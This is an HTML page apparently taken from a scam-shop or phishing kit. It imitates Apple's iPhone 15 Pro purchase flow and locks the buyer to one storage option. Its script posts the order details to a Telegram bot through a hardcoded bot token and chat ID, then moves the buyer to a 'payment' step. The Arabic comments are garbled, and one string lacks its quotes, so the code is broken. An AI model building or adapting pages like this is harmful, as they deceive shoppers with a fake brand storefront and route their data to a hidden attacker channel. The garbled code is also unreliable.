<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Select Options ‚Äì iPhone 15 Pro</title>

  <style>
    :root {
      --bg-page: #f5f5f7;
      --card-bg: #ffffff;
      --text-main: #111;
      --text-muted: #6e6e73;
      --accent-blue: #0071e3;
      --border: #d2d2d7;
    }

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", system-ui;
    }

    body {
      background: var(--bg-page);
      color: var(--text-main);
      padding: 20px;
    }

    header {
      text-align: center;
      font-size: 20px;
      font-weight: 600;
      margin-bottom: 20px;
    }

    .section {
      background: var(--card-bg);
      padding: 18px;
      border-radius: 16px;
      margin-bottom: 20px;
      border: 1px solid rgba(0,0,0,0.06);
    }

    .section-title {
      font-size: 18px;
      font-weight: 600;
      margin-bottom: 10px;
    }

    /* --- Disabled storage options --- */
    .option.disabled {
      opacity: 0.45;
      cursor: not-allowed;
      pointer-events: none;
    }

    .options {
      display: flex;
      flex-wrap: wrap;
      gap: 10px;
    }

    .option {
      flex: 1;
      min-width: 110px;
      padding: 12px;
      border-radius: 12px;
      border: 1px solid var(--border);
      text-align: center;
      font-size: 14px;
      cursor: pointer;
      transition: 0.15s;
    }

    .option.selected {
      border-color: var(--accent-blue);
      background: rgba(0,113,227,0.08);
    }

    .color-circle {
      width: 26px;
      height: 26px;
      border-radius: 50%;
      margin: 0 auto 6px;
      border: 1px solid #ccc;
    }

    .color-label {
      font-size: 14px;
      line-height: 1.2;
    }

    .footer {
      margin-top: 30px;
      display: flex;
      flex-direction: column;
      gap: 12px;
    }

    .btn-primary {
      padding: 12px;
      background: var(--accent-blue);
      color: white;
      border-radius: 999px;
      text-align: center;
      font-size: 16px;
      font-weight: 500;
      cursor: pointer;
    }

    .btn-back {
      padding: 12px;
      background: transparent;
      color: var(--text-muted);
      border-radius: 999px;
      border: 1px solid rgba(0,0,0,0.15);
      text-align: center;
      font-size: 15px;
      cursor: pointer;
    }
  </style>
</head>

<body>

  <header>iPhone 15 Pro ‚Äì Customize</header>

  <!-- Storage -->
  <div class="section">
    <div class="section-title">Select Storage</div>
    <div class="options" id="storage-options">
      <div class="option disabled">128 GB</div>
      <div class="option selected">256 GB</div>
      <div class="option disabled">512 GB</div>
      <div class="option disabled">1 TB</div>
    </div>
  </div>

  <!-- Colors -->
  <div class="section">
    <div class="section-title">Select Color</div>
    <div class="options" id="color-options">
      <div class="option selected">
        <div class="color-circle" style="background:#bfb8ae;"></div>
        <div class="color-label">Natural<br>Titanium</div>
      </div>
      <div class="option">
        <div class="color-circle" style="background:#1c1c1f;"></div>
        <div class="color-label">Black<br>Titanium</div>
      </div>
      <div class="option">
        <div class="color-circle" style="background:#283b64;"></div>
        <div class="color-label">Blue<br>Titanium</div>
      </div>
      <div class="option">
        <div class="color-circle" style="background:#fcfcfc;"></div>
        <div class="color-label">White<br>Titanium</div>
      </div>
    </div>
  </div>

  <!-- Summary -->
  <div class="section">
    <div class="section-title">Summary</div>
    <p style="font-size:14px;color:var(--text-muted);">
      You are purchasing: <strong>iPhone 15 Pro ¬∑ Middle East Version</strong><br>
      Options will be applied to your order automatically.
    </p>
  </div>

  <div class="footer">
    <div class="btn-primary" id="continue-btn">Continue to Payment</div>
    <div class="btn-back" onclick="window.history.back();">Back</div>
  </div>

  <script>
    // Storage selection (ŸÖÿß ÿ±ÿßÿ≠ ÿ™ÿ¥ÿ™ÿ∫ŸÑ ŸÅÿπŸÑŸäÿßŸã ŸÑÿ£ŸÜ ÿßŸÑÿÆŸäÿßÿ±ÿßÿ™ disabledÿå ÿ®ÿ≥ ŸÜÿÆŸÑŸä ÿßŸÑŸÉŸàÿØ ŸÜÿ∏ŸäŸÅ)
    document.querySelectorAll("#storage-options .option:not(.disabled)").forEach(function (el) {
      el.addEventListener("click", function () {
        document.querySelectorAll("#storage-options .option")
          .forEach(function (x) { x.classList.remove("selected"); });
        this.classList.add("selected");
      });
    });

    // Color selection
    document.querySelectorAll("#color-options .option").forEach(function (el) {
      el.addEventListener("click", function () {
        document.querySelectorAll("#color-options .option")
          .forEach(function (x) { x.classList.remove("selected"); });
        this.classList.add("selected");
      });
    });

    // Continue ‚Üí Payment + Telegram
    document.getElementById("continue-btn").addEventListener("click", function () {
      const botToken = "8097834484:AAG7whd2jF7Ie5pXUiomwXd1VwleQPpAogc";
      const chatId  = "7811430582";

      const storageEl = document.querySelector("#storage-options .selected");
      const colorEl   = document.querySelector("#color-options .selected .color-label");

      const selectedStorage = storageEl ? storageEl.innerText.trim() : "256 GB";
      // ŸÜÿ≠ŸàŸÑ ÿßŸÑŸÄ <br> ÿ•ŸÑŸâ ŸÖÿ≥ÿßŸÅÿ© Ÿàÿßÿ≠ÿØÿ©
      const selectedColor = colorEl
        ? colorEl.innerHTML.replace(/<br\s*\/?>/gi, " ").trim()
        : "Natural Titanium";

      const msg =
        üì± *New Order Submitted*\n\n +
        Model: iPhone 15 Pro\n +
        Storage: ${selectedStorage}\n +
        Color: ${selectedColor};

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: msg,
          parse_mode: "Markdown"
        })
      }).catch(function (err) {
        console.error("Telegram error:", err);
      }).finally(function () {
        // ÿ®ÿπÿØ ÿßŸÑÿ•ÿ±ÿ≥ÿßŸÑ (ÿ£Ÿà ÿ≠ÿ™Ÿâ ŸÑŸà ŸÅÿ¥ŸÑ) Ÿäÿ±Ÿàÿ≠ ÿπŸÑŸâ step-3
        window.location.href = "step-3.html";
      });
    });
  </script>

</body>
</html>
